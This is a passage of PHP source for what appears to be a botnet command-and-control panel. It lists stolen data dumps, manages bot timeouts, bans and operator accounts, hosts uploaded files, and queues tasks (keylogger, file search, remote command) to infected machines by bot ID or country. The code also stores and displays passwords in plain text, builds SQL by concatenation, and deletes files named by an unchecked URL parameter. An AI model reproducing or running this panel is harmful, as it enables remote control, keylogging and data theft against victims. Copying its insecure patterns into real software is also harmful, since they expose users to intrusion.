                . '<td style="width=10%">' . $row['bot_date'] . "<br>&nbsp;&nbsp;" . $row['bot_time'] . '</td>'
                . '<td style="width=20%"><a href="?act=dumps&track_hash=' . $row['track_hash'] . '&form=kill" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td>';
        }
        echo '</tr><tbody></table>';
        GetPagination($page, $str, $count_pages);
    } else {
        ?>
        <div class="panel panel-warning" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Warning</h3>
            </div>
            <div class="panel-body">
                No dumps in database!
            </div>
        </div>
    <?php
    }
}

if ($act == "logs") {
    $dirname = 'logs';
    GetFiles($dirname, $logs_files);
}

if ($act == "settings") {
    ?>
    <div class="panel panel-info" style="width: 50%;margin: 0 auto;">
        <div class="panel-heading"><b>Setting</b></div>
        <div class="panel-body">
            <ul class="nav nav-tabs">
                <li><a href="?act=settings">Settings</a></li>
                <?php
                if ($UserType == "root")
                    echo '<li><a href="?act=settings&do=accountlist">Account list</a></li>';
                ?>
                <li><a href="?act=settings&do=blacklist">Black list</a></li>
            </ul>
            <br>

            <?php
            if ($do == null) {
                ?>
                <form method="POST" action="">
                    Timeout for bots (in minutes, max. 60) : <br>
                    <input type="text" id="rate" class="form-control" style="width: 85%" name="rate"
                           value="<?php echo refresh_rate("get", null, null); ?>">

                    <input class="btn btn-sm btn-info pull-right" type="submit" name="refresh_rate" value="Change">
                    <br>
                    <br>
                    Edit current account : <br>
                    <input disabled type="text" style="width: 85%" id="username" class="form-control" name="username"
                           value="<?php echo $_SESSION['username'] ?>">
                    <input type="text" style="width: 85%" id="password" class="form-control" name="password"
                           placeholder="New password">
                    <input class="btn btn-sm btn-info pull-right" type="submit" name="change_pass" value="Change">
                </form>
            <?php
            }
            if ($do == 'blacklist') {
                ?>
                <form method="POST" action="">
                    <input type="text" style="width: 85%" id="banip" class="form-control" name="banip" placeholder="IP">
                    <input class="btn btn-sm btn-info pull-right" type="submit" name="addban" value="Add ban">
                </form>
                <?php
                $banned_ip = null;
                $sql = "SELECT * FROM banned";
                $res = mysql_query($sql);
                if ($res) {
                    $rows = mysql_num_rows($res);
                    if ($rows != 0) {
                        $gi = geoip_open("GeoIP/GeoIP.dat", GEOIP_STANDARD);
                        echo '<br><table class="table table-condensed table-hover">' .
                            '<tr>' .
                            '<th>#</th>' .
                            '<th>CN</th>' .
                            '<th>IP</th>' .
                            '<th>User agent</th>' .
                            '<th style="text-align: right">Options</th>' .
                            '<tr><tbody>';

                        for ($i = 0; $i < $rows; $i++) {
                            $row = mysql_fetch_assoc($res);

                            $bot_cn = geoip_country_code_by_addr($gi, $row['ip']);
                            if ($bot_cn == null) {
                                $bot_cn = "O1";
                            }

                            echo "<tr>";
                            echo "<td>" . $i . "</td>";

                            echo "<td style='vertical-align:middle;'>" . ShowFlag($bot_cn, $options[$bot_cn]) . "</td>";
                            echo "<td>" . $row['ip'] . "</td>";
                            echo "<td>" . $row['useragent'] . "</td>";
                            echo "<td style=\"text-align: right;\"><a href=\"#\" onclick=\"bootbox.alert('Referrer - " . $row['ref'] . "'); return false;\" title='Referrer - " . $row['ref'] . "'><span class='glyphicon glyphicon-info-sign'></a>&nbsp;<a href = \"?act=settings&do=blacklist&delete_ip=" . urlencode($row["ip"]) . "\" title=Delete><span class='glyphicon glyphicon-minus-sign'></a></td></tr>";
                        }
                        geoip_close($gi);
                        echo '</tbody></table>';
                    }
                }
            }
            if ($do == 'accountlist') {
                if ($UserType != "root")
                    return;
                ?>
                Add account : <br>
                <form method="POST" action="">
                    <input type="text" style="width: 85%" id="username" class="form-control" name="username"
                           placeholder="Username">
                    <input type="text" style="width: 85%" id="password" class="form-control" name="password"
                           placeholder="Password">
                    <input class="btn btn-sm btn-info pull-right" type="submit" name="add_new_account"
                           value="Add account">
                </form>
                <br><br>
                Account list :
                <?php

                $sql = "SELECT * FROM users";
                $res = mysql_query($sql);
                if ($res) {
                    $rows = mysql_num_rows($res);
                    if ($rows != 0) {

                        echo '<br><table class="table table-condensed table-hover">' .
                            '<tr>' .
                            '<th>#</th>' .
                            '<th>Username</th>' .
                            '<th>Password</th>' .
                            '<th style="text-align: right">Type</th>' .
                            '<th style="text-align: right">Options</th>' .
                            '<tr><tbody>';

                        for ($i = 0; $i < $rows; $i++) {
                            $row = mysql_fetch_assoc($res);
                            echo "<tr>";
                            echo "<td>" . $i . "</td>";
                            echo "<td>" . $row['username'] . "</td>";
                            echo "<td>" . $row['password'] . "</td>";

                            if ($row['type'] == "root")
                                echo "<td style=\"text-align: right;vertical-align:middle;\"><span class='label label-danger'><i>" . $row['type'] . "</i></span></td>";
                            else {
                                echo "<td style=\"text-align: right;vertical-align:middle;\"><span class='label label-default'><i>" . $row['type'] . "</i></span></td>";
                                echo "<td style=\"text-align: right\"><a href = \"?act=settings&do=accountlist&delete_account=" . urlencode($row["username"]) . "\" title=Delete><span class='glyphicon glyphicon-minus-sign'></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr>";
                            }
                        }
                        echo '</tbody></table>';
                    }
                }
            }
            ?>
        </div>
    </div>
    <?php
    if ($_GET['delete_ip']) {
        $delip = htmlspecialchars(addslashes($_GET['delete_ip']));
        $sql = "DELETE FROM banned WHERE ip='" . $delip . "'";
        if (mysql_query($sql))
            MessageRedirect($black_list);
    }
    if ($_GET['delete_account']) {
        $del_account = htmlspecialchars(addslashes($_GET['delete_account']));
        if ($del_account != "admin") {
            $sql = "DELETE FROM users WHERE username='" . $del_account . "'";
            mysql_query($sql);
        }
        MessageRedirect($account_list);
    }

    if ($_POST['addban']) {
        if (filter_var($_POST['banip'], FILTER_VALIDATE_IP)) {
            AddUserBan(htmlspecialchars(addslashes($_POST['banip'])));
            MessageRedirect($black_list);
        } else print '<script type="text/javascript">bootbox.alert("Wrong IP address!");</script>';
    }

    if ($_POST['refresh_rate'])
        refresh_rate("set", htmlspecialchars(addslashes($_POST['rate'])), null);

    if ($_POST['change_pass'])
        change_passw(htmlspecialchars(addslashes($_POST['password'])));

    if ($_POST['add_new_account'])
        register_new(htmlspecialchars(htmlspecialchars($_POST['username'])), htmlspecialchars(addslashes($_POST['password'])));

    echo "</div></div></div></center>";
}

if ($act == "upload") {
    $dirname = 'upload';

    if (is_uploaded_file($_FILES["fname"]["tmp_name"])) {
        $myfile = $_FILES['fname']['tmp_name'];
        $name = basename($_FILES['fname']['name']);
        move_uploaded_file($myfile, $dirname . "/" . $name);
    }
    ?>
    <div class="panel panel-info" style="width: 30%;margin: 0 auto;">
        <div class="panel-heading">
            <h3 class="panel-title">File uploader</h3>
        </div>
        <div class="panel-body">
            <form action="" method="POST" enctype="multipart/form-data">
                <input class="filestyle" type="file" name="fname"><br>
                <input class="btn btn-sm btn-info pull-right" type="submit" value="Upload"><br>
            </form>
        </div>
    </div>


    <br>
    <?php
    $dir = opendir($dirname);


    $files = scandir("upload/");
    while ($file = readdir($dir)) {
        if ($file != '.' && $file != '..' && $file != 'index.html' && $file != '.htaccess') {
            $exxx = iconv("ASCII", "UTF-8", $file);
            $arr_files[] = iconv("windows-1251", "UTF-8", $file);
            $arr_sizes[] = filesize($dirname . '/' . $file);
            $arr_datetime[] = date('Y-m-d H:i:s', filemtime($dirname . '/' . $file));
        }
    }

    if (array_multisort($arr_datetime, SORT_DESC, $arr_sizes, $arr_files)) {
        echo "<center>" .
            "<table class=\"table table-condensed table-hover\" style=\"text-align: center; width: auto;\" align=\"center\">" .
            "<tr class=\"active\">" .

            "<th style='text-align: center' width=\"5%\"> # </th>" .
            "<th width=\"65%\"> ( " . count($arr_files) . " ) Filename</th>" .
            "<th width=\"15%\"> Date </th>" .
            "<th width=\"10%\"> Size </th>" .
            "<th width=\"5%\"> Action </th>" .
            "</tr><tbody>";
        for ($w = 0; $w < count($arr_files); $w++) {
            {
                if ($arr_sizes[$w] >= 1024)
                    $fsstr = sprintf('%1.2f', $arr_sizes[$w] / 1024) . ' KB';
                else
                    $fsstr = $arr_sizes[$w] . ' B';

                $file_path = null;
                if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on'))
                    $file_path .= 'https://';
                else
                    $file_path .= 'http://';

                $file_path .= $_SERVER['SERVER_NAME'] . substr(str_replace('\\', '/', realpath(dirname(__FILE__))), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/upload/' . $arr_files[$w];

                echo '<tr class="active">' .
                    '<td width="5%">' . $w . '</td>' .
                    '<td  width="65%" style="text-align: left"><input size="100" style="background-color:transparent !important;border:none !important;" onclick="this.select();" type="text"
                    value="' . $file_path . '" /> ' .
                    '<td width="15%" style="text-align: left">' . $arr_datetime[$w] . '</td>' .
                    '<td width="10%" style="text-align: left">' . $fsstr . '</td>' .
                    '<td width="5%"><a href="' . $dirname . '/' . $arr_files[$w] . '" title = "Download"><span class="glyphicon glyphicon-save"></span></a>' .
                    '<a href="' . $_SERVER['PHP_SELF'] . '?act=' . $dirname . '&delete=' . $arr_files[$w] . '" title = "Delete"><span class="glyphicon glyphicon-trash"></span></a></td></tr>';
            }
        }

        echo '</tbody></table></center>';
        closedir($dir);

        if (!empty($_GET['delete'])) {
            $file = iconv('utf-8', 'cp1251', $dirname . '/' . $_GET['delete']);
            if (unlink($file))
                MessageRedirect($upload_files);
            else
                MessageRedirect($upload_files);
        }
    }
}

if ($act == "logout") {
    unset($_SESSION['uid']);
    echo '<script type="text/javascript">location.reload();</script>';
}

if (isset($_POST['create_task'])) {

    $urls = htmlspecialchars(addslashes($_POST['urls']));
    $type_attack = EncodeCommand($_POST['type_attack']);

    $tasks_total = intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_tasks WHERE status='1'"), 0));
    if (($type_attack == "keylogger" & $tasks_total >= 1) || (intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_tasks WHERE status='1' AND tasks_pref LIKE '%keylogger%'"), 0)) > 0)) {
        echo '<script type="text/javascript">ConfirmText("Keylogger works stably only when other tasks not running!", "' . $tasks_url . '");</script>';
        return;
    }

    if ($type_attack == "findfile" || $type_attack == "keylogger" || $type_attack == "cmd") {
        $urls = urlencode($urls);
        $urls = str_replace('+', ' ', $urls);
    }

    if (!empty($_POST['bot_uid']))
        $bots = "ID:" . htmlspecialchars(addslashes($_POST['bot_uid']));
    else
        $bots = htmlspecialchars(addslashes($_POST['country']));

    $execs = htmlspecialchars(addslashes($_POST['execs']));
    if (!$execs)
        $execs = "0";

    $task_id = time() . rand(111111, 999999);
    $task_date = date('Y-m-d H:i:s');

    $task_pref = $task_id . $adelim . $type_attack . " ";
    $task_postf = $adelim;

    $sql = "INSERT INTO botnet_tasks (task_id, task_date, tasks_pref, command, tasks_postf, status, by_user, execs, needexecs, failed, bots) " .
        "VALUES ('$task_id', '$task_date', '$task_pref', '$urls', '$task_postf', '1', '$UserName', '0', '$execs', '0', '$bots')";

    mysql_query($sql);
    MessageRedirect($tasks_url);
}

?>

</body>
</html>